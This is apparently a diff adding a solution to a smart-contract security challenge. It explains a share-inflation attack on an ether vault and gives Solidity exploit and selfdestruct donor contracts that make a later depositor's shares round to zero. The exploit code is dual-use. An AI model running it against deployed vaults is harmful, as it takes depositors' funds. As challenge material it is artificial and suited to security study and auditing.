@@ -1,0 +1,36 @@
+The bug is a share-inflation attack. The vault prices shares on `address(this).balance`, so the attacker can raise the balance without minting shares.
+
+1. The attacker deposits 1 wei and gets 1 share.
+2. The attacker force-sends the remaining ~1 ether to the vault through a helper contract that selfdestructs into it. The vault has no `receive` function, so this is the only way to send it ether. The vault now holds 1 ether against 1 share.
+3. A deposits 2 ether and gets `2e18 * 1 / 1e18 = 2` shares. Total shares are now 3 against 3 ether.
+4. B deposits 0.5 ether and gets `0.5e18 * 3 / 3e18 = 0` shares after rounding down. B cannot redeem anything, so B receives 0 of the 0.5 ether deposited, which breaks the invariant.
+
+I have not run this against the verifier.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface IVault {
+    function deposit() external payable returns (uint256);
+}
+
+contract Donor {
+    constructor(address target) payable {
+        selfdestruct(payable(target));
+    }
+}
+
+contract Exploit {
+    address public target;
+
+    constructor(address _target) payable {
+        target = _target;
+    }
+
+    function run() external {
+        IVault(target).deposit{value: 1}();
+        new Donor{value: address(this).balance}(target);
+    }
+}
+```
